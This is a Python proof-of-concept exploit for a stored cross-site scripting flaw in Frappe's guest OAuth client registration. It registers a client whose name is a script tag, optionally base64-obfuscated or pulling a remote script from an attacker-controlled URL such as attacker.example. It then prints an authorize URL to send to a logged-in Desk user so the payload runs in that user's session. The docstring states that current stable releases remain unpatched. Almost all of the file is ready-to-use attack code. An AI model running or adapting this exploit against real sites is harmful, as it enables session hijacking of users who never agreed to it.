#!/usr/bin/env python3
"""Frappe guest OAuth stored XSS (FRAPPE-02).

Frappe exposes RFC 7591 dynamic OAuth client registration to unauthenticated
Guests, and the client's `client_name` is later reflected without escaping on the
`/api/method/frappe.integrations.oauth2.authorize` consent page. A Guest can
therefore register a client whose name is a `<script>` tag, then hand the
resulting authorize URL to a logged-in Desk user; the payload runs in that user's
session as soon as the page renders, before any Allow click.

This client registers the payload and prints the authorize URL to send. It needs
no Frappe credentials. Reviewed against Frappe Framework 16.29.0.

Fix status: the sanitiser fix (PR #41626) was merged to Frappe develop on
2026-08-17 with its backport deferred; no stable release carries it as of
2026-10-08 (16.51.0 and 15.122.0 are still affected).
"""

from __future__ import annotations

import argparse
import base64
import html
import json
import urllib.parse

from frappe_chain_common import (
    PocError,
    add_color_argument,
    authorize_url,
    bad,
    banner,
    disable_color,
    good,
    info,
    normalize_origin,
    register_oauth_client,
)


DEFAULT_REDIRECT = "https://example.invalid/frappe02-callback"
DEFAULT_JAVASCRIPT = "alert(document.domain)"


def normalize_http_url(value: str, label: str) -> str:
    value = value.strip()
    try:
        parsed = urllib.parse.urlsplit(value)
        _ = parsed.port
    except ValueError as exc:
        raise PocError(f"invalid {label}: {exc}") from exc
    if parsed.scheme not in {"http", "https"} or not parsed.hostname:
        raise PocError(f"{label} must be an HTTP(S) URL")
    if parsed.username or parsed.password or parsed.fragment:
        raise PocError(f"{label} must not contain userinfo or a fragment")
    return value


def build_client_name(
    target: str, javascript: str | None, script_url: str | None
) -> tuple[str, str]:
    if script_url:
        script_url = normalize_http_url(script_url, "script URL")
        if target.startswith("https://") and script_url.startswith("http://"):
            raise PocError("an HTTPS target requires an HTTPS --script-url")
        tag = f"<script src='{html.escape(script_url, quote=True)}'></script>"
        description = script_url
    else:
        code = DEFAULT_JAVASCRIPT if javascript is None else javascript
        if not code:
            raise PocError("--javascript must not be empty")
        if javascript is None:
            tag = f"<script>{code}</script>"
            description = "the default alert payload"
        else:
            try:
                encoded = base64.b64encode(code.encode("ascii")).decode("ascii")
            except UnicodeEncodeError as exc:
                raise PocError("--javascript must be ASCII; use --script-url otherwise") from exc
            tag = f"<script>eval(atob('{encoded}'))</script>"
            description = "the supplied JavaScript"

    stored = json.dumps(tag)
    if len(stored) > 140:
        raise PocError(
            f"stored client_name is {len(stored)} characters; use a shorter payload"
        )
    return stored, description


def make_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description=__doc__,
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="examples:\n"
               "  %(prog)s --url https://frappe.example\n"
               "  %(prog)s --url https://frappe.example --javascript 'alert(1)'\n"
               "  %(prog)s --url https://frappe.example --script-url https://attacker.example/x.js\n",
    )
    parser.add_argument("--url", required=True, metavar="URL", help="Frappe site origin")
    payload = parser.add_mutually_exclusive_group()
    payload.add_argument("--javascript", metavar="JS", help="short ASCII JavaScript (default: alert(document.domain))")
    payload.add_argument("--script-url", metavar="URL", help="attacker-controlled script URL")
    parser.add_argument("--redirect-uri", default=DEFAULT_REDIRECT, metavar="URI", help="OAuth redirect URI to register")
    parser.add_argument("--timeout", type=float, default=20.0, metavar="SECS", help="HTTP timeout (default: 20)")
    parser.add_argument("--insecure", action="store_true", help="disable TLS certificate verification")
    add_color_argument(parser)
    return parser


def run(args: argparse.Namespace) -> int:
    if args.no_color:
        disable_color()
    banner("guest OAuth registration stored XSS  ·  FRAPPE-02")
    if args.timeout <= 0:
        raise PocError("--timeout must be greater than zero")
    target = normalize_origin(args.url, "target URL")
    redirect_uri = normalize_http_url(args.redirect_uri, "redirect URI")
    client_name, description = build_client_name(
        target, args.javascript, args.script_url
    )
    info(f"registering a Guest OAuth client carrying {description}")
    client_id, registered_redirect = register_oauth_client(
        target,
        redirect_uri,
        client_name,
        args.timeout,
        args.insecure,
        "frappe02-stored-xss",
    )
    good(f"registered OAuth client {client_id}")
    info("send the authorize URL below to a logged-in Desk User; the payload runs")
    info("when the consent page renders, before any Allow click")
    print(authorize_url(target, registered_redirect, client_id), flush=True)
    return 0


def main() -> int:
    try:
        return run(make_parser().parse_args())
    except PocError as exc:
        bad(str(exc))
        return 1
    except KeyboardInterrupt:
        bad("interrupted")
        return 130


if __name__ == "__main__":
    raise SystemExit(main())
